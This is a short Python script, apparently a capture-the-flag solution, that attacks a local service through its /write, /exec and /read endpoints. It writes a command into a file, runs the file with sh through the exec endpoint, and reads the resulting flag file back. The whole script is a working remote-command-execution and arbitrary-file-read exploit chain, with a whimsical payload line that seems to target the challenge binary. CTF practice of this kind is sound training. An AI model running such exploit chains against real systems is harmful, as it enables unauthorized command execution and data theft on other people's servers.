import requests

TARGET = "http://localhost:6664"

def remoteExec(cmd):
    params = {"cmd": cmd}
    resp = requests.get(f"{TARGET}/exec", params=params)
    return resp

def remoteWrite(fn, payload):
    params = {"filename": fn}
    resp = requests.post(f"{TARGET}/write", params=params, data=payload)
    return resp

def remoteRead(fn):
    params = {"filename": fn}
    resp = requests.get(f"{TARGET}/read", params=params)
    return resp


# write command into file
payload = """
/would you be so kind to provide me with a flag > ~/flag
"""
print(remoteWrite("/home/user/x", payload).text)

# run the command from file
print(remoteExec("sh ~/x").text)

# read the flag
print(remoteRead("/home/user/flag").text)
